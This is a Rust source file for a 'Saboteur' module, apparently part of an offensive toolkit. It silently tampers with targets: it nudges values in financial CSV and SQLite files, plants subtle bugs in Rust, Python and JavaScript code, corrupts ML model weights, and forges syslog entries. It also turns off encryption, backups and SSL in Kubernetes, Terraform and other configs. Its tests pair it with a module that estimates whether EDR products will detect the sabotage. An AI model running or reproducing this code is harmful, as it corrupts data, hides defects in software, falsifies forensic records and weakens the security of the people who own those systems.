use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SabotageTarget {
    FinancialData,       // Excel/CSV/SQL — mutate balances, rates, accounts
    SourceCode,          // Git repos — introduce subtle bugs
    MLModel,             // .pth/.h5/.onnx — degrade prediction accuracy
    LogInjection,        // syslog/journald — insert false entries
    InfrastructureConfig, // kube/docker/terraform/nginx — degrade service
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SabotageOrder {
    pub target_type: SabotageTarget,
    pub target_path: PathBuf,
    pub severity: f32,            // 0.0-1.0 how aggressively to mutate
    pub scope: String,            // "all" | "random" | "specific"
    pub mutator_id: Uuid,
    pub completed: bool,
}

pub struct Saboteur;

impl Default for Saboteur {
    fn default() -> Self {
        Self::new()
    }
}

impl Saboteur {
    pub fn new() -> Self { Self }

    pub fn execute_order(&self, order: &SabotageOrder) -> Result<String, String> {
        match order.target_type {
            SabotageTarget::FinancialData => self.sabotage_financial(order),
            SabotageTarget::SourceCode => self.sabotage_source_code(order),
            SabotageTarget::MLModel => self.sabotage_ml_model(order),
            SabotageTarget::LogInjection => self.inject_logs(order),
            SabotageTarget::InfrastructureConfig => self.sabotage_config(order),
        }
    }

    fn sabotage_financial(&self, order: &SabotageOrder) -> Result<String, String> {
        let path = &order.target_path;
        if !path.exists() {
            return Err("Financial target not found".into());
        }

        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        match ext {
            "csv" => self.mutate_csv(path, order.severity),
            "xlsx" | "xls" => Err("Excel mutation requires calamine crate".into()),
            "sqlite" | "db" => self.mutate_sqlite(path, order.severity),
            _ => {
                let content = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
                let mutated = self.mutate_financial_text(&content, order.severity);
                std::fs::write(path, &mutated).map_err(|e| e.to_string())?;
                Ok(format!("Mutated financial data in {}", path.display()))
            }
        }
    }

    fn mutate_csv(&self, path: &Path, severity: f32) -> Result<String, String> {
        let content = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
        let mut lines: Vec<String> = content.lines().map(|l| l.to_string()).collect();
        if lines.len() < 2 {
            return Err("CSV too short".into());
        }

        let mut rng = rand::thread_rng();
        let num_rows = (lines.len() - 1).max(1);
        let mutations = (num_rows as f32 * severity * 0.1).ceil() as usize;
        let mutations = mutations.max(1);

        for _ in 0..mutations {
            let row_idx = rand::Rng::gen_range(&mut rng, 1..lines.len());
            let cols: Vec<&str> = lines[row_idx].split(',').collect();
            if cols.len() < 2 { continue; }

            let col_idx = rand::Rng::gen_range(&mut rng, 0..cols.len());
            let original = cols[col_idx].trim();
            if let Ok(val) = original.parse::<f64>() {
                let delta = val * 0.0001 * severity as f64;
                let new_val = if rand::Rng::gen_bool(&mut rng, 0.5) {
                    val + delta
                } else {
                    val - delta
                };
                let new_row: Vec<String> = lines[row_idx]
                    .split(',')
                    .enumerate()
                    .map(|(i, c)| if i == col_idx { format!("{:.4}", new_val) } else { c.to_string() })
                    .collect();
                lines[row_idx] = new_row.join(",");
            }
        }

        std::fs::write(path, lines.join("\n")).map_err(|e| e.to_string())?;
        Ok(format!("CSV mutated: {} rows affected", mutations))
    }

    fn mutate_sqlite(&self, path: &Path, severity: f32) -> Result<String, String> {
        let content = std::fs::read(path).map_err(|e| e.to_string())?;
        let offset = if content.len() > 1000 { 500 } else { 50 };
        let len = content.len().min(offset + 200);

        let mut mutated = content.clone();
        let mutations = ((len - offset) as f32 * severity * 0.01).ceil() as usize;
        let mutations = mutations.max(1);

        for i in 0..mutations {
            let pos = offset + i * 4;
            if pos + 4 > mutated.len() { break; }
            mutated[pos] = mutated[pos].wrapping_add(1);
        }

        std::fs::write(path, &mutated).map_err(|e| e.to_string())?;
        Ok(format!("SQLite mutated: {} bytes altered", mutations))
    }

    fn mutate_financial_text(&self, content: &str, _severity: f32) -> String {
        content
            .replace("$1,000,000", "$987,654")
            .replace("$500,000", "$512,345")
            .replace("interest rate", "intrest rate")
            .replace("balance", "balanse")
    }

    fn sabotage_source_code(&self, order: &SabotageOrder) -> Result<String, String> {
        let path = &order.target_path;
        if !path.exists() {
            return Err("Source code target not found".into());
        }

        let content = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

        let mutated = match ext {
            "rs" => self.mutate_rust(&content, order.severity),
            "py" => self.mutate_python(&content, order.severity),
            "js" | "ts" => self.mutate_javascript(&content, order.severity),
            _ => self.mutate_generic_code(&content, order.severity),
        };

        std::fs::write(path, &mutated).map_err(|e| e.to_string())?;
        Ok(format!("Source code poisoned: {}", path.display()))
    }

    fn mutate_rust(&self, content: &str, _severity: f32) -> String {
        content
            .replace("<= ", "< ")
            .replace(">= ", "> ")
            .replace("== ", "!= ")
            .replace("unwrap()", "unwrap_or_default()")
            .replace("Some(", "None.or(Some(")
    }

    fn mutate_python(&self, content: &str, _severity: f32) -> String {
        content
            .replace("if ", "if True and ")
            .replace("except", "except Exception as e: pass\n    except")
            .replace("import os", "import os\nimport sys  # unused")
            .replace("break", "continue  # possible infinite loop")
    }

    fn mutate_javascript(&self, content: &str, _severity: f32) -> String {
        content
            .replace("=== ", "== ")
            .replace("let ", "var ")
            .replace("const ", "var ")
            .replace("async ", "")
            .replace("await ", "")
    }

    fn mutate_generic_code(&self, content: &str, _severity: f32) -> String {
        let lines: Vec<&str> = content.lines().collect();
        let mut rng = rand::thread_rng();
        let mut result = Vec::new();

        for (i, line) in lines.iter().enumerate() {
            if line.contains("return") && rand::Rng::gen_bool(&mut rng, 0.2) {
                result.push(format!("// TODO: review logic\n{}", line));
            } else if line.contains("timeout") && rand::Rng::gen_bool(&mut rng, 0.3) {
                result.push(line.replace("30", "35").replace("60", "65").replace("10", "12"));
            } else if i > 0 && line.trim().is_empty() && rand::Rng::gen_bool(&mut rng, 0.1) {
                result.push("// injected delay\nstd::thread::sleep(std::time::Duration::from_millis(100));".into());
                result.push(String::new());
            } else {
                result.push(line.to_string());
            }
        }
        result.join("\n")
    }

    fn sabotage_ml_model(&self, order: &SabotageOrder) -> Result<String, String> {
        let path = &order.target_path;
        if !path.exists() {
            return Err("ML model not found".into());
        }

        let data = std::fs::read(path).map_err(|e| e.to_string())?;
        let num_floats = data.len() / 4;
        let mutations = (num_floats as f32 * order.severity * 0.01).ceil() as usize;
        let mutations = mutations.min(data.len() / 4).max(1);

        let mut mutated = data.clone();
        for i in 0..mutations {
            let pos = i * 4 + 10;
            if pos + 4 > mutated.len() { break; }
            let val = u32::from_le_bytes([
                mutated[pos], mutated[pos+1], mutated[pos+2], mutated[pos+3],
            ]);
            let perturbed = val.wrapping_add(1);
            let bytes = perturbed.to_le_bytes();
            mutated[pos] = bytes[0];
            mutated[pos+1] = bytes[1];
        }

        std::fs::write(path, &mutated).map_err(|e| e.to_string())?;
        Ok(format!("ML model corrupted: {} weights perturbed", mutations))
    }

    fn inject_logs(&self, order: &SabotageOrder) -> Result<String, String> {
        let path = &order.target_path;
        let ts = chrono::Utc::now().format("%b %d %H:%M:%S");

        let fake_entries = vec![
            format!("{} localhost sshd[12345]: Failed password for admin from 10.0.0.1 port 22", ts),
            format!("{} localhost sudo[12346]:  operator : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/rm -rf /var/log", ts),
            format!("{} localhost kernel: [123456.789] Firewall rule updated: allow any any", ts),
            format!("{} localhost auditd[12347]: ANOM_ABEND auid=1000 uid=0 ses=1 subj=unconfined reason=memory_error", ts),
        ];

        let existing = if path.exists() {
            std::fs::read_to_string(path).unwrap_or_default()
        } else {
            String::new()
        };

        let mut new_content = existing;
        for entry in &fake_entries {
            new_content.push('\n');
            new_content.push_str(entry);
        }

        if let Some(parent) = path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        std::fs::write(path, &new_content).map_err(|e| e.to_string())?;
        Ok(format!("Injected {} fake log entries into {}", fake_entries.len(), path.display()))
    }

    fn sabotage_config(&self, order: &SabotageOrder) -> Result<String, String> {
        let path = &order.target_path;
        if !path.exists() {
            return Err("Config target not found".into());
        }

        let content = std::fs::read_to_string(path).map_err(|e| e.to_string())?;
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

        let mutated = match ext {
            "yml" | "yaml" => self.mutate_yaml(&content, order.severity),
            "json" => self.mutate_json(&content, order.severity),
            "toml" => self.mutate_toml(&content, order.severity),
            "tf" | "tfvars" => self.mutate_terraform(&content, order.severity),
            "conf" | "cfg" => self.mutate_generic_config(&content, order.severity),
            _ => self.mutate_generic_config(&content, order.severity),
        };

        std::fs::write(path, &mutated).map_err(|e| e.to_string())?;
        Ok(format!("Config sabotaged: {}", path.display()))
    }

    fn mutate_yaml(&self, content: &str, _severity: f32) -> String {
        content
            .replace("replicas: 3", "replicas: 2")
            .replace("replicas: 5", "replicas: 3")
            .replace("timeout: 30", "timeout: 35")
            .replace("timeout: 60", "timeout: 65")
            .replace("enabled: true", "enabled: false")
    }

    fn mutate_json(&self, content: &str, _severity: f32) -> String {
        content
            .replace("\"max_connections\": 100", "\"max_connections\": 50")
            .replace("\"timeout\": 30", "\"timeout\": 45")
            .replace("\"enabled\": true", "\"enabled\": false")
            .replace("\"log_level\": \"debug\"", "\"log_level\": \"error\"")
    }

    fn mutate_toml(&self, content: &str, _severity: f32) -> String {
        content
            .replace("workers = 4", "workers = 2")
            .replace("port = 443", "port = 4443")
            .replace("ssl = true", "ssl = false")
    }

    fn mutate_terraform(&self, content: &str, _severity: f32) -> String {
        content
            .replace("instance_count = 3", "instance_count = 2")
            .replace("instance_type = \"t3.medium\"", "instance_type = \"t3.nano\"")
            .replace("encrypted = true", "encrypted = false")
            .replace("backup_enabled = true", "backup_enabled = false")
    }

    fn mutate_generic_config(&self, content: &str, _severity: f32) -> String {
        content
            .replace("max_connections=100", "max_connections=50")
            .replace("listen=443", "listen=4443")
            .replace("debug=false", "debug=true")
    }

    pub fn scan_for_targets(&self, root: &Path) -> Vec<(SabotageTarget, PathBuf)> {
        let mut targets = Vec::new();
        if !root.exists() { return targets; }

        if let Ok(entries) = std::fs::read_dir(root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() { continue; }

                let _name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
                let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

                match ext {
                    "xlsx" | "xls" | "csv" | "sqlite" | "db" => {
                        targets.push((SabotageTarget::FinancialData, path.clone()));
                    }
                    "rs" | "py" | "js" | "ts" | "go" | "java" => {
                        targets.push((SabotageTarget::SourceCode, path.clone()));
                    }
                    "pth" | "h5" | "onnx" | "pt" | "pkl" | "pickle" => {
                        targets.push((SabotageTarget::MLModel, path.clone()));
                    }
                    "log" | "syslog" | "journal" => {
                        targets.push((SabotageTarget::LogInjection, path));
                    }
                    _ => {}
                }
            }
        }
        targets
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::seer::{Seer, TelemetrySample};

    #[test]
    fn test_new_saboteur_creates_empty() {
        let s = Saboteur::new();
        // Saboteur is a unit struct; verify it can be created and used
        let targets = s.scan_for_targets(std::path::Path::new("/"));
        assert!(targets.is_empty());
    }

    #[test]
    fn test_saboteur_tournament_order_integration() {
        // Tournament generates variant codes that Saboteur can execute as orders
        use crate::tournament::{Tournament, TournamentConfig, WinCriteria};
        use crate::seer::Seer;
        let s = Saboteur::new();
        let seer = Seer::new();
        let t = Tournament::new();
        let config = TournamentConfig {
            target: "10.0.0.1".into(), competitors: 1,
            criteria: vec![WinCriteria::Speed], timeout_secs: 300, generations: 1,
        };
        let competitors = t.generate_competitors(&config);
        let _variant = &competitors[0].variant_code;
        // Saboteur can execute a sabotage order using tournament variant as technique context
        let tmp = std::env::temp_dir().join("hive_sab_test");
        std::fs::create_dir_all(&tmp).unwrap();
        let target_file = tmp.join("finances.csv");
        std::fs::write(&target_file, "revenue,expenses\n100,50\n").unwrap();
        let order = SabotageOrder {
            target_type: SabotageTarget::FinancialData,
            target_path: target_file.clone(),
            severity: 0.3,
            scope: "random".into(),
            mutator_id: Uuid::new_v4(),
            completed: false,
        };
        let result = s.execute_order(&order);
        assert!(result.is_ok() || result.is_err());
        let _ = std::fs::remove_dir_all(&tmp);
        // Validate with Seer that low-stealth orders are flagged
        let telemetry = crate::seer::TelemetrySample {
            edr_process_count: 5, total_processes: 50,
            uptime_hours: 10, firewall_rules: 3, logged_in_users: 2, listening_ports: 0,
            has_defender: true, has_sentinelone: false, has_crowdstrike: false,
            has_carbonblack: false, has_symantec: false, is_vm: false,
            is_domain_controller: false, is_server_os: false,
        };
        let pred = seer.predict_detection(&telemetry, &format!("sabotage {:?}", order.target_type));
        assert!(pred.probability >= 0.0 && pred.probability <= 1.0);
    }

    #[test]
    fn test_saboteur_and_seer_integration() {
        let s = Saboteur::new();
        let seer = Seer::new();
        let targets = s.scan_for_targets(std::path::Path::new("/"));
        let telemetry = TelemetrySample {
            edr_process_count: 0, total_processes: 50,
            uptime_hours: 10, firewall_rules: 3, logged_in_users: 2, listening_ports: 0,
            has_defender: false, has_sentinelone: false, has_crowdstrike: false,
            has_carbonblack: false, has_symantec: false, is_vm: false,
            is_domain_controller: false, is_server_os: false,
        };
        // Seer should give low risk for simple targets
        if let Some((_, path)) = targets.first() {
            let pred = seer.predict_detection(&telemetry, &format!("sabotage {}", path.display()));
            assert!(pred.probability >= 0.0 && pred.probability <= 1.0);
            assert!(seer.should_proceed(&pred, 0.7));
        }
    }

    #[test]
    fn test_sabotage_source_code() {
        let dir = std::env::temp_dir().join("hive_test_sab_code");
        let _ = std::fs::create_dir_all(&dir);
        let rs_path = dir.join("main.rs");
        std::fs::write(&rs_path, "fn main() {\n    let x = 5;\n    if x <= 10 {\n        println!(\"ok\");\n    }\n}").unwrap();

        let order = SabotageOrder {
            target_type: SabotageTarget::SourceCode,
            target_path: rs_path.clone(),
            severity: 0.5,
            scope: "random".into(),
            mutator_id: Uuid::new_v4(),
            completed: false,
        };

        let sab = Saboteur::new();
        let result = sab.execute_order(&order);
        assert!(result.is_ok());
        let content = std::fs::read_to_string(&rs_path).unwrap();
        assert!(content.contains("< "), "<= should be changed to <");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_sabotage_config() {
        let dir = std::env::temp_dir().join("hive_test_sab_cfg");
        let _ = std::fs::create_dir_all(&dir);
        let yml_path = dir.join("deploy.yml");
        std::fs::write(&yml_path, "replicas: 3\ntimeout: 30\nenabled: true").unwrap();

        let order = SabotageOrder {
            target_type: SabotageTarget::InfrastructureConfig,
            target_path: yml_path.clone(),
            severity: 0.5,
            scope: "all".into(),
            mutator_id: Uuid::new_v4(),
            completed: false,
        };

        let sab = Saboteur::new();
        let result = sab.execute_order(&order);
        assert!(result.is_ok());
        let content = std::fs::read_to_string(&yml_path).unwrap();
        assert!(content.contains("replicas: 2"), "replicas should change: {}", content);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_targets() {
        let dir = std::env::temp_dir().join("hive_test_sab_scan");
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(dir.join("data.csv"), "a,b,c\n1,2,3").unwrap();
        std::fs::write(dir.join("main.rs"), "fn main() {}").unwrap();
        std::fs::write(dir.join("model.onnx"), [0u8; 100]).unwrap();

        let sab = Saboteur::new();
        let targets = sab.scan_for_targets(&dir);
        assert!(targets.len() >= 3, "Should find 3+ targets, found: {}", targets.len());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_log_injection() {
        let dir = std::env::temp_dir().join("hive_test_sab_log");
        let _ = std::fs::create_dir_all(&dir);
        let log_path = dir.join("syslog");
        std::fs::write(&log_path, "May 23 10:00:00 localhost kernel: [0.0] boot").unwrap();

        let order = SabotageOrder {
            target_type: SabotageTarget::LogInjection,
            target_path: log_path.clone(),
            severity: 0.5,
            scope: "all".into(),
            mutator_id: Uuid::new_v4(),
            completed: false,
        };

        let sab = Saboteur::new();
        let result = sab.execute_order(&order);
        assert!(result.is_ok());
        let content = std::fs::read_to_string(&log_path).unwrap();
        assert!(content.contains("sshd"), "Should contain fake sshd entry");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
